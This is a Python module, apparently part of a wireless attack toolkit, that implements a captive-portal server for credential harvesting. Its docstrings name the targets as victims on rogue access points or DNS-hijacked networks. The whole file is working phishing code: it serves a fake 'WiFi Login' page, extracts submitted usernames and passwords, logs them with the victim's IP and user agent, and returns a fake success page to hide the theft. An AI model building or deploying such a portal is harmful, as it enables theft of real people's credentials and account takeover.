"""
Captive Portal
==============
HTTP captive portal for credential harvesting.

Serves fake login pages and captures credentials from
victims connecting to rogue APs or DNS hijacked networks.
"""

import time
from typing import Dict, List, Any, Optional
from dataclasses import dataclass, asdict


@dataclass
class CapturedCredential:
    """Captured credential from captive portal."""
    username: str
    password: str
    ip: str
    user_agent: str
    timestamp: float
    portal_url: str


class CaptivePortal:
    """Captive portal HTTP server for credential harvesting."""

    def __init__(self, listen_addr: str = "0.0.0.0", port: int = 80):
        self.listen_addr = listen_addr
        self.port = port
        self._running = False
        self.credentials: List[CapturedCredential] = []
        self.template_html = self._default_template()
        self.stats = {
            "requests_served": 0,
            "credentials_captured": 0,
        }

    def _default_template(self) -> str:
        """Default fake login page HTML."""
        return """
<!DOCTYPE html>
<html>
<head>
    <title>WiFi Login</title>
    <style>
        body { font-family: Arial; background: #f0f0f0; display: flex; justify-content: center; align-items: center; height: 100vh; }
        .login-box { background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); width: 300px; }
        h2 { text-align: center; color: #333; margin-bottom: 20px; }
        input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; }
        button { width: 100%; padding: 10px; background: #007bff; color: white; border: none; border-radius: 4px; cursor: pointer; }
        button:hover { background: #0056b3; }
    </style>
</head>
<body>
    <div class="login-box">
        <h2>WiFi Login</h2>
        <form method="POST" action="/login">
            <input type="text" name="username" placeholder="Username" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Login</button>
        </form>
    </div>
</body>
</html>
"""

    def handle_request(self, method: str, path: str, headers: Dict[str, str],
                      body: Optional[str] = None, client_ip: str = "unknown") -> Optional[str]:
        """
        Handle HTTP request.

        Returns:
            Response body string or None
        """
        self.stats["requests_served"] += 1

        if method == "GET":
            return self.template_html

        elif method == "POST" and path == "/login":
            if body:
                username = self._extract_form_field(body, "username")
                password = self._extract_form_field(body, "password")
                if username and password:
                    cred = CapturedCredential(
                        username=username,
                        password=password,
                        ip=client_ip,
                        user_agent=headers.get("User-Agent", ""),
                        timestamp=time.time(),
                        portal_url=headers.get("Host", ""),
                    )
                    self.credentials.append(cred)
                    self.stats["credentials_captured"] += 1
            return self._success_page()

        return None

    def _extract_form_field(self, body: str, field: str) -> str:
        """Extract form field from POST body."""
        for part in body.split("&"):
            if part.startswith(f"{field}="):
                return part.split("=", 1)[1]
        return ""

    def _success_page(self) -> str:
        """Return success page after credential capture."""
        return """
<!DOCTYPE html>
<html>
<head><title>Login Successful</title></head>
<body>
    <h2>Login Successful</h2>
    <p>You are now connected to the network.</p>
</body>
</html>
"""

    def get_credentials(self) -> List[Dict[str, Any]]:
        """Get all captured credentials."""
        return [asdict(c) for c in self.credentials]

    def clear_credentials(self) -> None:
        """Clear all captured credentials."""
        self.credentials.clear()
        self.stats["credentials_captured"] = 0

    def get_stats(self) -> Dict[str, int]:
        """Return portal statistics."""
        return {**self.stats, "total_credentials": len(self.credentials)}
